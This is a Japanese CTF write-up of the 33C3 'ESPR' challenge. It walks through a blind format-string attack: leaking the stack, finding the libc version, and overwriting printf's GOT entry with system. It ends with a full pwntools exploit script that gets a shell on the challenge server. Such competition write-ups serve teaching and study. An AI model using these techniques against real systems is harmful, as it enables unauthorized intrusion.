---
layout: post
redirect_from:
  - /writeup/ctf/2016/33c3-ctf-espr/
  - /blog/2016/12/30/33c3-ctf-espr/
date: "2016-12-30T13:39:05+09:00"
tags: [ "ctf", "writeup", "pwn", "33c3-ctf", "blind", "libc", "format-string-attack" ]
---

# 33C3 CTF: ESPR

blindでFSAする問題は先日の[Sharif CTF](https://ctftime.org/event/370)で$3$問出た。さらに同CTFでlibc特定する問題も出てたので完全に復習だった。

CODEVSの帰りに誘ったzeosuttさんがチームに入って一緒に解いていた。
氏はpwn 150 babyfengshui, for 100 exfil, misc 75 pdfmakerと通しており、やはり強いじゃないかという気持ちになった。
特にbabyfengshuiはSolvesがこの問題と同じぐらいなので。

## problem

バイナリは与えられない。自明なformat string bugがある。改行が帰ってこないのでちょっと面倒。

``` sh
$ nc 78.46.224.86 1337
hoge
hoge%p
0x7ffd968f92b8%p%p%p
0x7ffd968f92b80x7eff9b10c7700x7eff9ae15700
```

## solution

とりあえずstack上にflagが置いてあるだろうとエスパーして、表示させてみる。
しかしない。

``` sh
[+] Opening connection to 78.46.224.86 on port 1337: Done
[*] 00000000  e8 22 c2 88  fd 7f 00 00                            │·"··│····││
[*] 00000000  70 27 71 93  ae 7f 00 00                            │p'q·│····││
[*] 00000000  00 b7 41 93  ae 7f 00 00                            │··A·│····││
[*] 00000000  36 70 c2 00  00 00 00 00                            │6p··│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  25 35 24 30  31 36 6c 78                            │%5$0│16lx││
[*] 00000000  20 25 36 24  30 31 36 6c                            │ %6$│016l││
[*] 00000000  78 20 25 37  24 30 31 36                            │x %7│$016││
[*] 00000000  31 36 6c 78  20 25 31 32                            │16lx│ %12││
[*] 00000000  24 30 31 36  6c 78 20 24                            │$016│lx $││
[*] 00000000  00 00 00 00  00 00 ff 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  ee 23 c2 88  fd 7f 00 00                            │·#··│····││
[*] 00000000  00 16 71 93  ae 7f 00 00                            │··q·│····││
[*] 00000000  01 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  0d 06 40 00  00 00 00 00                            │··@·│····││
[*] 00000000  30 00 00 00  00 00 00 00                            │0···│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  c0 05 40 00  00 00 00 00                            │··@·│····││
[*] 00000000  c0 04 40 00  00 00 00 00                            │··@·│····││
[*] 00000000  f0 24 c2 88  fd 7f 00 00                            │·$··│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  f1 f3 36 93  ae 7f 00 00                            │··6·│····││
[*] 00000000  bc 6b 71 93  ae 7f 00 00                            │·kq·│····││
[*] 00000000  f8 24 c2 88  fd 7f 00 00                            │·$··│····││
[*] 00000000  00 16 71 93  01 00 00 00                            │··q·│····││
[*] 00000000  90 04 40 00  00 00 00 00                            │··@·│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  05 2a 05 07  ad 2a 1e 28                            │·*··│·*·(││
[*] 00000000  c0 04 40 00  00 00 00 00                            │··@·│····││
[*] 00000000  f0 24 c2 88  fd 7f 00 00                            │·$··│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  05 2a c5 44  a9 3b e5 d7                            │·*·D│·;··││
[*] 00000000  05 2a d7 eb  40 0c 43 d7                            │·*··│@·C·││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  08 25 c2 88  fd 7f 00 00                            │·%··│····││
[*] 00000000  68 e1 b3 93  ae 7f 00 00                            │h···│····││
[*] 00000000  db 88 92 93  ae 7f 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  c0 04 40 00  00 00 00 00                            │··@·│····││
[*] 00000000  f0 24 c2 88  fd 7f 00 00                            │·$··│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  ea 04 40 00  00 00 00 00                            │··@·│····││
[*] 00000000  e8 24 c2 88  fd 7f 00 00                            │·$··│····││
[*] 00000000  1c 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  01 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  17 2e c2 88  fd 7f 00 00                            │·.··│····││ <- argv[0]
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  2c 2e c2 88  fd 7f 00 00                            │,.··│····││ <- envp[0]
[*] 00000000  3e 2e c2 88  fd 7f 00 00                            │>.··│····││ <- envp[1]
[*] 00000000  4d 2e c2 88  fd 7f 00 00                            │M.··│····││
[*] 00000000  62 2e c2 88  fd 7f 00 00                            │b.··│····││
[*] 00000000  74 2e c2 88  fd 7f 00 00                            │t.··│····││
[*] 00000000  8c 2e c2 88  fd 7f 00 00                            │·.··│····││
[*] 00000000  ce 2e c2 88  fd 7f 00 00                            │·.··│····││
[*] 00000000  df 2e c2 88  fd 7f 00 00                            │·.··│····││
[*] 00000000  ef 2e c2 88  fd 7f 00 00                            │·.··│····││
[*] 00000000  03 2f c2 88  fd 7f 00 00                            │·/··│····││
[*] 00000000  12 2f c2 88  fd 7f 00 00                            │·/··│····││
[*] 00000000  23 2f c2 88  fd 7f 00 00                            │#/··│····││
[*] 00000000  39 2f c2 88  fd 7f 00 00                            │9/··│····││
[*] 00000000  55 2f c2 88  fd 7f 00 00                            │U/··│····││
[*] 00000000  69 2f c2 88  fd 7f 00 00                            │i/··│····││
[*] 00000000  86 2f c2 88  fd 7f 00 00                            │·/··│····││
[*] 00000000  9b 2f c2 88  fd 7f 00 00                            │·/··│····││
[*] 00000000  a7 2f c2 88  fd 7f 00 00                            │·/··│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  21 00 00 00  00 00 00 00                            │!···│····││
[*] 00000000  00 d0 c3 88  fd 7f 00 00                            │····│····││
[*] 00000000  10 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  ff fb 8b 07  00 00 00 00                            │····│····││
[*] 00000000  06 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 10 00 00  00 00 00 00                            │····│····││
[*] 00000000  11 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  64 00 00 00  00 00 00 00                            │d···│····││
[*] 00000000  03 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  40 00 40 00  00 00 00 00                            │@·@·│····││
[*] 00000000  04 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  38 00 00 00  00 00 00 00                            │8···│····││
[*] 00000000  05 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  08 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  07 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 80 91 93  ae 7f 00 00                            │····│····││
[*] 00000000  08 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  09 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  c0 04 40 00  00 00 00 00                            │··@·│····││
[*] 00000000  0b 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  e9 03 00 00  00 00 00 00                            │····│····││
[*] 00000000  0c 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  e9 03 00 00  00 00 00 00                            │····│····││
[*] 00000000  0d 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  e9 03 00 00  00 00 00 00                            │····│····││
[*] 00000000  0e 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  e9 03 00 00  00 00 00 00                            │····│····││
[*] 00000000  17 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  19 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  d9 26 c2 88  fd 7f 00 00                            │·&··│····││
[*] 00000000  1f 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  e3 2f c2 88  fd 7f 00 00                            │·/··│····││
[*] 00000000  0f 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  e9 26 c2 88  fd 7f 00 00                            │·&··│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 bf 14 66  71 e5 af df                            │···f│q···││
[*] 00000000  81 42 86 16  15 0f 94 02                            │·B··│····││
[*] 00000000  95 78 38 36  5f 36 34 00                            │·x86│_64·││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
```

次は環境変数にあってほしいと思って見てみる。これも違う。

``` sh
[+] Opening connection to 78.46.224.86 on port 1337: Done
[*] '/home/challenge/espr'
[*] 'LANGUAGE=en_US:en'
[*] '  USER=challenge'
[*] 'HOME=/home/challenge'
[*] 'LOGNAME=challenge'
[*] 'JOURNAL_STREAM=8:802770'
[*] 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
[*] 'LANG=en_US.UTF-8'
[*] ' SHELL=/bin/bash'
[*] 'PWD=/home/challenge'
[*] ' SOCAT_PID=15113'
[*] 'SOCAT_PPID=11053'
[*] 'SOCAT_VERSION=1.7.3.1'
[*] Closed connection to 78.46.224.86 port 1337
```

普通にshellを取るしかなさそう。


-   `buf`: 6$
-   `argv[0]`: 66$
-   `envp[0]`: 68$

GOTの様子を見る。

```
[+] Opening connection to 78.46.224.86 on port 1337: Done
[*] argv: 0x7ffe72701e16
[*] argv[0]: '/home/challenge/espr'
[*] 0x601000: ' \x0e`'
[*] 0x601008: 0x7ff485dc4168
[*] 0x601010: 0x7ff485bb58f0
[*] 0x601018: 0x7ff48562b550
[*] 0x601020: 0x7ff485645030
[*] 0x601028: 0x7ff4856a1640
[*] 0x601030: ''
[*] 0x601038: ''
[*] 0x601040: ''
```

`__libc_start_main`, `printf`はあるとしても関数名との対応が不明。
手元のDBと突き合わせたが未発見だったのでlibc headerを読みそのentry pointに飛ばしてlibc versionを特定する。
GOT overwriteが可能で助かった。
しかし結局libcは手元にあるやつだった。見落していたようだ。

```
GNU C Library (Ubuntu GLIBC 2.24-3ubuntu2) stable release version 2.24, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 6.2.0 20161005.
Available extensions:
    crypt add-on version 2.1 by Michael Glad and others
    GNU Libidn by Simon Josefsson
    Native POSIX Threads Library by Ulrich Drepper et al
    BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

あとは`printf`のGOTを`system`に置き換えて`/bin/sh`を入力すればshell。

flag: `33C3_f1rst_tshirt_challenge?!`

## implementation

``` python
#!/usr/bin/env python2
import itertools
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='78.46.224.86')
parser.add_argument('port', nargs='?', default=1337, type=int)
parser.add_argument('--log-level', default='info')
parser.add_argument('--libc', default='libc6_2.24-3ubuntu2_amd64.so')
args = parser.parse_args()
context.log_level = args.log_level
context.arch = 'amd64'

p = remote(args.host, args.port)

# for i in itertools.count():
#     p.sendline('%%%d$016lx %%%d$016lx %%%d$016lx %%%d$016lx $' % (4*i+1, 4*i+2, 4*i+3, 4*i+4))
#     for s in p.recvuntil('$', drop=True).split():
#         log.info(fiddling.hexdump(p64(int(s, 16))).splitlines()[0])

def flush():
    delim = 'DELIMITER'
    p.sendline(delim)
    p.recvuntil(delim)
def read_ix(ix):
    delim = ' DELIMITER'
    p.sendline(('%%%d$ld' % ix) + delim)
    return int(p.recvuntil(delim, drop=True))
def read_addr(addr):
    p.sendline('%7$s    ' + p64(addr))
    i = p64(addr).find('\0')
    delim = '    ' + p64(addr)[: [i, 8][i is None]]
    s = p.recvuntil(delim, drop=True)
    return s
def write_addr(addr, s):
    payload = ''
    acc = 0
    for i, c in enumerate(s):
        payload += '%%%dc%%%d$hhn' % ((ord(c) - acc - 1) % 256 + 1, 6 + 2*len(s) + i)
        pad = (- len(payload)) % 16
        payload += ' ' * pad
        acc = ord(c) + pad
    for i, _ in enumerate(s):
        payload += p64(addr + i)
    p.sendline(payload)

# argv = read_ix(66)
# log.info('argv: %#x', argv)
# log.info('argv[0]: %s', repr(read_addr(argv)))

# for addr in range(0x601000, 0x601000 + 0x30, 0x8):
#    log.info('%#x: %s', addr, repr(read_addr(addr)))
libcfunc_got = 0x601028

s = read_addr(libcfunc_got)
libcfunc = u64(s.ljust(8, '\0'))
log.info('libcfunc: %#x', libcfunc)

# # find the ELF header
# addr = libcfunc / 0x1000 * 0x1000
# while True:
#     s = read_addr(addr)
#     log.info('%#x (%#x): %s', addr, libcfunc - addr, repr(s))
#     if s.startswith('\x7fELF'):
#         libc_base = addr
#         break
#     addr -= 0x1000
libcfunc_offset = 0xcc640
libc_base = libcfunc - libcfunc_offset
log.info('libc base: %#x', libc_base)
assert read_addr(libc_base).startswith('\x7fELF')

# # jump to libc entry point
# s = read_addr(libc_base + 0x18) # Elf64_Ehdr.e_entry
# libcentry = libc_base + u64(s.ljust(8, '\0'))
# log.info('libc entry offset: %#x', libcentry - libc_base)
# log.info('libc entry: %#x', libcentry)
# write_addr(libcfunc_got, p64(libcentry))

libc = ELF(args.libc)
system = libc_base + libc.symbols['system']
log.info('system: %#x', system)
write_addr(libcfunc_got - 0x10, p64(system))
p.sendline('/bin/sh')
time.sleep(3)
p.sendline('id')
p.interactive()
```
